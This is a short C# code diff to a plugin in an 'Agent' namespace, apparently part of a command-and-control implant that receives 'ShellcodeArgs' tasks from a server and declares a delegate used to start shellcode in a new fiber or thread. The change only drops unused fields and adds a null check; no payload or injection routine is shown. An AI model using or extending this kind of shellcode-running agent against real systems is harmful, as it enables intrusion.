@@ -36,12 +36,9 @@ namespace Agent
         private delegate IntPtr CFDelegate(int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);
 
         private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
-        private string output_task_id { get; set; }
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
         {
@@ -59,7 +56,10 @@ namespace Agent
             }
 
             ShellcodeArgs args = JsonSerializer.Deserialize<ShellcodeArgs>(job.task.parameters);
-
+            if(args is null){
+                return;
+            }
+            
             if (!args.Validate())
             {
                 await messageManager.AddResponse(new TaskResponse()
